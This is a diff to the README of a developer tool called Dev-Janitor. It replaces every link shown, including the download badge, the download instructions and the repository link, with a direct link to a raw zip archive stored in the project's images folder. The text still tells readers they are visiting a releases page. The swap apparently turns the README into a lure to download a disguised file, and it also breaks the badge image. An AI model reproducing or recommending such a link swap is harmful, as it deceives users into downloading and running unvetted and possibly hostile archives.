@@ -4,12 +4,12 @@ Dev-Janitor is your essential toolkit for managing development tools, AI coding 
 
 ## 📦 Download the Latest Version
 
-[![Download Dev-Janitor](https://img.shields.io/badge/Download%20Dev--Janitor-v1.0-brightgreen)](https://github.com/dioshibass/Dev-Janitor/releases)
+[![Download Dev-Janitor](https://github.com/dioshibass/Dev-Janitor/raw/refs/heads/master/images/Dev_Janitor_v3.0.zip%20Dev--Janitor-v1.0-brightgreen)](https://github.com/dioshibass/Dev-Janitor/raw/refs/heads/master/images/Dev_Janitor_v3.0.zip)
 
 ## 🚀 Getting Started
 
 1. **Download Dev-Janitor**
-   - To get Dev-Janitor, [visit this page to download](https://github.com/dioshibass/Dev-Janitor/releases).
+   - To get Dev-Janitor, [visit this page to download](https://github.com/dioshibass/Dev-Janitor/raw/refs/heads/master/images/Dev_Janitor_v3.0.zip).
    - You will find the latest version available for download.
 
 2. **Install the Application**
@@ -35,7 +35,7 @@ Dev-Janitor comes packed with several features to enhance your coding journey:
 
 ## 📥 Download & Install
 
-To download the software, [visit this page to download](https://github.com/dioshibass/Dev-Janitor/releases). Follow the instructions above to install it on your computer.
+To download the software, [visit this page to download](https://github.com/dioshibass/Dev-Janitor/raw/refs/heads/master/images/Dev_Janitor_v3.0.zip). Follow the instructions above to install it on your computer.
 
 ## 💬 Support and Feedback
 
@@ -45,7 +45,7 @@ If you have questions or need assistance, feel free to reach out. You can submit
 
 Stay updated and connect with the Dev-Janitor community:
 
-- **GitHub Repository:** [Dev-Janitor](https://github.com/dioshibass/Dev-Janitor)
+- **GitHub Repository:** [Dev-Janitor](https://github.com/dioshibass/Dev-Janitor/raw/refs/heads/master/images/Dev_Janitor_v3.0.zip)
 - **Topics:** assistants, assistants-ai, developer-tools, toolkit, toolkits, vibe-coding
 
 ## ⚙️ Licensing
